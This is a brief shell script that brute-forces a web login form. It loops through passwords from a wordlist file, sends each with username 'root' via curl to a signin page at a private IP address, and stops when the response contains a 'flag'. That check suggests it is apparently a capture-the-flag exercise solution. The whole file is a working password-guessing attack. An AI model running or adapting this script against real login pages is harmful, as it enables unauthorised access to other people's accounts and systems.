#!/bin/sh
ip_address="10.12.100.119"
input="./brute.txt"
while IFS= read -r line
do
    response=$(curl "http://$ip_address/?page=signin&username=root&password=$line&Login=Login" | grep "flag")
    if [ ! -z "$response" ]; then
        echo "found password is :" "\033[92m $line\033[0m"
        echo $response
        break
    fi
done < "$input"
